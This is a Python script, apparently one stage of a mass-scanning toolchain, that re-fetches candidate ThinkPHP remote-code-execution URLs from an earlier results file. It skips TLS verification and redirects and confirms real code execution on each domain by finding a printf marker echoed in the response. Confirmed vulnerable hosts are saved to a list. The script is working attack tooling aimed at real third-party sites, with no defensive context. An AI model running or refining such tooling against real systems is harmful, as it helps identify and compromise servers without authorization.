#!/usr/bin/env python3
"""tp_rce_verify.py - 严格验证TP RCE命中
真实RCE判定: 原始URL响应(不跟随重定向)直接包含mark
"""
import urllib.request, urllib.parse, ssl, re, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
MARK = 'tprce_mark_8842'

def fetch_raw(url, timeout=12):
    """不跟随重定向"""
    try:
        req = urllib.request.Request(url, headers=UA)
        # 禁用自动重定向
        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, req, fp, code, msg, headers, newurl):
                return None
        opener = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=ctx))
        r = opener.open(req, timeout=timeout)
        return r.status, r.read(30000).decode('utf-8', 'ignore'), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read(30000).decode('utf-8', 'ignore'), e.geturl()
    except Exception:
        return 0, '', ''

def verify(dom, name, url):
    st, b, fu = fetch_raw(url)
    if MARK in b:
        # 确认mark是RCE输出(printf回显)不是URL反射
        pos = b.find(MARK)
        ctx_str = b[max(0,pos-50):pos+len(MARK)+20]
        return True, st, fu, ctx_str.replace(chr(10), ' ')[:120]
    return False, st, fu, ''

def main():
    hits = []
    with open('/tmp/tp_rce_results.txt') as f:
        for line in f:
            parts = line.strip().split('\t')
            if len(parts) >= 4 and parts[0] == 'RCE':
                dom, name, url = parts[1], parts[2], parts[3]
                ok, st, fu, ctx = verify(dom, name, url)
                if ok:
                    print('VERIFIED RCE: %s [%s] st=%d ctx=%s' % (dom, name, st, ctx), flush=True)
                    hits.append((dom, name, url))
                else:
                    print('FALSE: %s [%s] st=%d fu=%s' % (dom, name, st, fu[:60]), flush=True)
    print('=== VERIFIED: %d ===' % len(hits), flush=True)
    with open('/tmp/tp_rce_verified.txt', 'w') as f:
        for h in hits:
            f.write('\t'.join(h) + '\n')

if __name__ == '__main__':
    main()
